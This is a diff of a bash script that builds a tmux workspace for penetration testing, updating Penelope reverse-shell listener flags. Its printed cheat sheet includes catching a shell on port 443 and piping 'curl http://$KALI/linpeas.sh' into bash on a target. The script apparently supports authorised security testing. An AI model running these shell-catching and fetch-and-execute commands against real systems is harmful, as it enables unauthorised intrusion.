@@ -391,8 +391,8 @@ build_tmux() {
     tx tmux split-window -h -t "${SESSION_NAME}:staging.${P0}"
     tx tmux send-keys -t "${SESSION_NAME}:staging.${P1}" "$src_cmd" C-m
     tx tmux send-keys -t "${SESSION_NAME}:staging.${P1}" "echo -e '${BOLD}${YELLOW}Ready for Penelope:${NC}'" C-m
-    tx tmux send-keys -t "${SESSION_NAME}:staging.${P1}" "echo -e '  penelope -0 ${KALI_IP} 443'" C-m
-    tx tmux send-keys -t "${SESSION_NAME}:staging.${P1}" "echo -e '  penelope -0 ${KALI_IP} 4444'" C-m
+    tx tmux send-keys -t "${SESSION_NAME}:staging.${P1}" "echo -e '  penelope -p 443 -O'" C-m
+    tx tmux send-keys -t "${SESSION_NAME}:staging.${P1}" "echo -e '  penelope -p 4444 -O'" C-m
     tx tmux send-keys -t "${SESSION_NAME}:staging.${P1}" "echo ''" C-m
 
     tx tmux new-window -t "${SESSION_NAME}" -n "notes"
@@ -495,7 +495,7 @@ print_summary() {
     echo -e "    python3 -m http.server 80    # already running in staging"
     echo -e ""
     echo -e "    ${GREEN}# Catch a shell${NC}"
-    echo -e "    penelope -0 \$KALI 443"
+    echo -e "    penelope -p 443 -O"
     echo -e ""
     echo -e "    ${GREEN}# Download to target (Linux)${NC}"
     echo -e "    curl http://\$KALI/linpeas.sh | bash"
